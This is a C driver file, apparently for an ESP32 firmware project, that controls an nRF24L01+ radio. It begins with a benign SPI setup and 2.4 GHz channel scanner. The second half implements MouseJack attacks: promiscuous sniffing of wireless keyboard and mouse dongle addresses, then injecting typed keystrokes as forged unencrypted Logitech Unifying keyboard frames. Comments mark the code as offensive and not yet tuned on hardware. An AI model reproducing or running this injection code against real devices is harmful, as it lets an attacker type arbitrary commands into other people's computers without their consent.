// LxveOS nRF24L01+ driver — see lxveos_nrf24.h. Increment 1: SPI bring-up, identify, RPD channel scan.
//
// SPI mode 0, MSB-first. Commands: R_REGISTER = 0x00|reg, W_REGISTER = 0x20|reg (5-bit reg address). CE is
// a separate GPIO (not the SPI CS): driving it high puts the radio into active RX/TX; a channel-energy
// sample is "CE high -> wait -> CE low -> read RPD". The RPD (Received Power Detector, reg 0x09 bit0) latches
// high when RX power exceeded ~-64 dBm during the listen — sweeping it across the 126 channels gives a
// 2.4 GHz activity map. UNVERIFIED on hardware; extra confirms the identity read + scan on a real module.
#include "lxveos_nrf24.h"
#include "lxveos_arm.h"
#include "lxveos_radiomath.h"
#include "lxveos_spibus.h"

#include "esp_log.h"
#include "esp_rom_sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"

static const char *TAG = "lxveos_nrf24";

// nRF24 SPI commands / registers
#define NRF_CMD_R_REGISTER 0x00
#define NRF_CMD_W_REGISTER 0x20
#define NRF_CMD_FLUSH_RX   0xE2
#define NRF_REG_CONFIG     0x00
#define NRF_REG_EN_AA      0x01
#define NRF_REG_EN_RXADDR  0x02
#define NRF_REG_SETUP_AW   0x03
#define NRF_REG_RF_CH      0x05
#define NRF_REG_RF_SETUP   0x06
#define NRF_REG_STATUS     0x07
#define NRF_REG_RPD        0x09

static spi_device_handle_t s_dev;
static int  s_ce = -1;
static bool s_begun;
static bool s_present;

static uint8_t nrf_read_reg(uint8_t reg)
{
    uint8_t tx[2] = {(uint8_t)(NRF_CMD_R_REGISTER | (reg & 0x1F)), 0xFF};
    uint8_t rx[2] = {0, 0};
    spi_transaction_t t = { .length = 16, .tx_buffer = tx, .rx_buffer = rx };
    spi_device_polling_transmit(s_dev, &t);
    return rx[1];
}

static void nrf_write_reg(uint8_t reg, uint8_t val)
{
    uint8_t tx[2] = {(uint8_t)(NRF_CMD_W_REGISTER | (reg & 0x1F)), val};
    spi_transaction_t t = { .length = 16, .tx_buffer = tx, .rx_buffer = NULL };
    spi_device_polling_transmit(s_dev, &t);
}

static void nrf_cmd(uint8_t cmd)
{
    spi_transaction_t t = { .length = 8, .tx_buffer = &cmd, .rx_buffer = NULL };
    spi_device_polling_transmit(s_dev, &t);
}

static inline void ce(int level)
{
    if (s_ce >= 0) {
        gpio_set_level(s_ce, level);
    }
}

esp_err_t lxveos_nrf24_begin(int sck, int miso, int mosi, int csn, int ce_gpio)
{
    if (s_begun) {
        return ESP_ERR_INVALID_STATE;
    }
    if (sck < 0 || miso < 0 || mosi < 0 || csn < 0 || ce_gpio < 0) {
        return ESP_ERR_INVALID_ARG;
    }

    // Shared SPI3 bus (also used by the CC1101 add-on) — refcounted so neither driver frees it under the other.
    esp_err_t err = lxveos_spibus_acquire(sck, miso, mosi);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "spibus acquire failed: %s", esp_err_to_name(err));
        return err;
    }

    spi_device_interface_config_t devcfg = {
        .clock_speed_hz = 4000000,   // 4 MHz — well within the nRF24's 10 MHz SPI limit
        .mode = 0,
        .spics_io_num = csn,
        .queue_size = 1,
    };
    err = spi_bus_add_device(SPI3_HOST, &devcfg, &s_dev);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "spi_bus_add_device failed: %s", esp_err_to_name(err));
        lxveos_spibus_release();
        return err;
    }

    gpio_config_t io = {
        .pin_bit_mask = 1ULL << ce_gpio,
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };
    gpio_config(&io);
    s_ce = ce_gpio;
    ce(0);
    s_begun = true;

    vTaskDelay(pdMS_TO_TICKS(5));   // power-on settle

    // Configure as a primary receiver with auto-ack off (so it hears everything), then probe presence by
    // writing a test channel and reading it back.
    nrf_write_reg(NRF_REG_CONFIG, 0x03);   // PWR_UP | PRIM_RX
    nrf_write_reg(NRF_REG_EN_AA, 0x00);    // disable auto-ack on all pipes
    nrf_write_reg(NRF_REG_EN_RXADDR, 0x01);
    nrf_write_reg(NRF_REG_SETUP_AW, 0x03); // 5-byte address width
    nrf_write_reg(NRF_REG_RF_SETUP, 0x0F); // 2 Mbps, max PA (RX side; affects sensitivity only)
    nrf_cmd(NRF_CMD_FLUSH_RX);
    nrf_write_reg(NRF_REG_STATUS, 0x70);   // clear any latched IRQ flags

    nrf_write_reg(NRF_REG_RF_CH, 0x55);
    s_present = (nrf_read_reg(NRF_REG_RF_CH) == 0x55);
    ESP_LOGI(TAG, "nRF24 begin: RF_CH read-back %s", s_present ? "OK (module detected)" : "MISMATCH (check wiring)");
    return ESP_OK;
}

esp_err_t lxveos_nrf24_end(void)
{
    if (!s_begun) {
        return ESP_OK;
    }
    ce(0);
    nrf_write_reg(NRF_REG_CONFIG, 0x00);   // power down
    spi_bus_remove_device(s_dev);
    lxveos_spibus_release();
    if (s_ce >= 0) {
        gpio_reset_pin(s_ce);
    }
    s_dev = NULL;
    s_ce = -1;
    s_begun = false;
    s_present = false;
    return ESP_OK;
}

bool lxveos_nrf24_present(void)
{
    return s_begun && s_present;
}

esp_err_t lxveos_nrf24_scan(uint8_t *counts, uint16_t sweeps)
{
    if (!s_begun) {
        return ESP_ERR_INVALID_STATE;
    }
    if (counts == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (sweeps == 0) {
        sweeps = 100;
    }
    if (sweeps > 1000) {
        sweeps = 1000;
    }

    for (int i = 0; i < LXVEOS_NRF24_CHANNELS; i++) {
        counts[i] = 0;
    }

    for (uint16_t s = 0; s < sweeps; s++) {
        for (uint8_t ch = 0; ch < LXVEOS_NRF24_CHANNELS; ch++) {
            nrf_write_reg(NRF_REG_RF_CH, ch);
            ce(1);
            esp_rom_delay_us(200);      // listen window (RPD needs >~40 us of RX)
            ce(0);
            if (nrf_read_reg(NRF_REG_RPD) & 0x01) {
                if (counts[ch] < 255) {
                    counts[ch]++;
                }
            }
        }
        if ((s & 0x0F) == 0) {
            vTaskDelay(1);              // yield periodically so the watchdog stays happy
        }
    }
    return ESP_OK;
}

// ── Increment 2: promiscuous sniff + MouseJack keystroke injection ────────────────────────────────────
// HW-TUNING PENDING: address discovery + the injected frame format are device-specific (Logitech Unifying
// vs Microsoft vs generic ESB) and timing/channel-sensitive. This is the structurally-correct primitive
// (CI-green); extra tunes channel hopping, data rate, and per-vendor payloads on real dongles.
#define NRF_CMD_R_RX_PAYLOAD 0x61
#define NRF_CMD_W_TX_PAYLOAD 0xA0
#define NRF_CMD_FLUSH_TX     0xE1
#define NRF_REG_RX_ADDR_P0   0x0A
#define NRF_REG_TX_ADDR      0x10
#define NRF_REG_RX_PW_P0     0x11
#define NRF_REG_SETUP_RETR   0x04
#define NRF_REG_FIFO_STATUS  0x17

// Burst-write a multi-byte register (e.g. a 5-byte address).
static void nrf_write_buf(uint8_t reg, const uint8_t *buf, size_t len)
{
    uint8_t tx[6];
    tx[0] = (uint8_t)(NRF_CMD_W_REGISTER | (reg & 0x1F));
    for (size_t i = 0; i < len && i < 5; i++) {
        tx[1 + i] = buf[i];
    }
    spi_transaction_t t = { .length = 8 * (len + 1), .tx_buffer = tx, .rx_buffer = NULL };
    spi_device_polling_transmit(s_dev, &t);
}

// Send a command byte followed by a payload (e.g. W_TX_PAYLOAD).
static void nrf_cmd_buf(uint8_t cmd, const uint8_t *buf, size_t len)
{
    uint8_t tx[33];
    tx[0] = cmd;
    for (size_t i = 0; i < len && i < 32; i++) {
        tx[1 + i] = buf[i];
    }
    spi_transaction_t t = { .length = 8 * (len + 1), .tx_buffer = tx, .rx_buffer = NULL };
    spi_device_polling_transmit(s_dev, &t);
}

// Minimal US-layout ASCII -> HID usage (letters/digits/space/enter + a few), for typed injection.
static bool nrf_ascii_to_hid(char c, uint8_t *mod, uint8_t *key)
{
    *mod = 0;
    *key = 0;
    if (c >= 'a' && c <= 'z') { *key = 0x04 + (c - 'a'); return true; }
    if (c >= 'A' && c <= 'Z') { *mod = 0x02; *key = 0x04 + (c - 'A'); return true; }
    if (c >= '1' && c <= '9') { *key = 0x1E + (c - '1'); return true; }
    switch (c) {
    case '0': *key = 0x27; return true;
    case ' ': *key = 0x2C; return true;
    case '\n': *key = 0x28; return true;
    case '-': *key = 0x2D; return true;
    case '.': *key = 0x37; return true;
    case '/': *key = 0x38; return true;
    case ':': *mod = 0x02; *key = 0x33; return true;
    default: return false;
    }
}

esp_err_t lxveos_nrf24_sniff(uint8_t addr[5], uint8_t *channel, uint32_t timeout_ms)
{
    if (!s_begun) {
        return ESP_ERR_INVALID_STATE;
    }
    if (addr == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (timeout_ms == 0) {
        timeout_ms = 8000;
    }

    // Pseudo-promiscuous: 2-byte "address" acting as a preamble match, CRC + auto-ack off, max payload.
    ce(0);
    nrf_write_reg(NRF_REG_CONFIG, 0x00);
    nrf_write_reg(NRF_REG_EN_AA, 0x00);
    nrf_write_reg(NRF_REG_SETUP_AW, 0x01);     // 2-byte address width (address = preamble)
    uint8_t promisc[2] = {0x00, 0xAA};
    nrf_write_buf(NRF_REG_RX_ADDR_P0, promisc, 2);
    nrf_write_reg(NRF_REG_RX_PW_P0, 32);
    nrf_write_reg(NRF_REG_EN_RXADDR, 0x01);
    nrf_write_reg(NRF_REG_RF_SETUP, 0x0E);     // 2 Mbps (common for HID dongles)
    nrf_write_reg(NRF_REG_CONFIG, 0x03);       // PWR_UP | PRIM_RX, EN_CRC off

    for (uint32_t elapsed = 0; elapsed < timeout_ms; ) {
        for (uint8_t ch = 2; ch < 84; ch += 3) {   // hop the common 2.4 GHz HID span
            nrf_write_reg(NRF_REG_RF_CH, ch);
            nrf_cmd(NRF_CMD_FLUSH_RX);
            nrf_write_reg(NRF_REG_STATUS, 0x70);
            ce(1);
            esp_rom_delay_us(600);
            ce(0);
            if (!(nrf_read_reg(NRF_REG_FIFO_STATUS) & 0x01)) {   // RX FIFO not empty
                uint8_t pay[32] = {0};
                uint8_t tx[33] = { NRF_CMD_R_RX_PAYLOAD };
                spi_transaction_t t = { .length = 8 * 6, .tx_buffer = tx, .rx_buffer = pay };
                spi_device_polling_transmit(s_dev, &t);
                // pay[0] is the command echo/status; the recovered address candidate is the next 5 bytes.
                for (int i = 0; i < 5; i++) {
                    addr[i] = pay[1 + i];
                }
                if (channel) {
                    *channel = ch;
                }
                return ESP_OK;
            }
            elapsed += 1;
            if ((ch & 0x0F) == 0) {
                vTaskDelay(1);
            }
        }
    }
    return ESP_ERR_TIMEOUT;
}

esp_err_t lxveos_nrf24_inject_text(const uint8_t addr[5], uint8_t channel, const char *text)
{
    if (!s_begun) {
        return ESP_ERR_INVALID_STATE;
    }
    if (addr == NULL || text == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (!lxveos_arm_can_emit()) {
        return ESP_ERR_NOT_ALLOWED;    // offensive TX — must be armed
    }

    // TX to the target address, ESB with auto-ack + retransmit (Logitech Unifying uses 2 Mbps).
    ce(0);
    nrf_write_reg(NRF_REG_CONFIG, 0x00);
    nrf_write_buf(NRF_REG_TX_ADDR, addr, 5);
    nrf_write_buf(NRF_REG_RX_ADDR_P0, addr, 5);   // for the ACK
    nrf_write_reg(NRF_REG_SETUP_AW, 0x03);        // 5-byte address
    nrf_write_reg(NRF_REG_EN_AA, 0x01);
    nrf_write_reg(NRF_REG_SETUP_RETR, 0x1F);      // 15 retries, 500 us
    nrf_write_reg(NRF_REG_RF_CH, channel);
    nrf_write_reg(NRF_REG_RF_SETUP, 0x0E);        // 2 Mbps
    nrf_write_reg(NRF_REG_CONFIG, 0x0E);          // PWR_UP | PRIM_TX | EN_CRC (2-byte)
    nrf_cmd(NRF_CMD_FLUSH_TX);

    for (const char *p = text; *p; p++) {
        uint8_t mod, key;
        if (!nrf_ascii_to_hid(*p, &mod, &key)) {
            continue;
        }
        // Logitech Unifying unencrypted keyboard frame (10 bytes): dev-idx, 0xC1, mod, 6 keys, checksum
        // (checksum makes the 10 bytes sum to 0 mod 256). Press then release.
        for (int phase = 0; phase < 2; phase++) {
            uint8_t f[10] = {0x00, 0xC1, (uint8_t)(phase == 0 ? mod : 0),
                             (uint8_t)(phase == 0 ? key : 0), 0, 0, 0, 0, 0, 0};
            f[9] = lxveos_unifying_checksum(f, sizeof(f));
            nrf_cmd(NRF_CMD_FLUSH_TX);
            nrf_cmd_buf(NRF_CMD_W_TX_PAYLOAD, f, sizeof(f));
            ce(1);
            esp_rom_delay_us(15);
            ce(0);
            vTaskDelay(pdMS_TO_TICKS(8));
            nrf_write_reg(NRF_REG_STATUS, 0x70);   // clear TX_DS/MAX_RT
        }
    }

    ce(0);
    nrf_write_reg(NRF_REG_CONFIG, 0x00);           // power down
    ESP_LOGI(TAG, "mousejack: injected typed text on ch %u", channel);
    return ESP_OK;
}
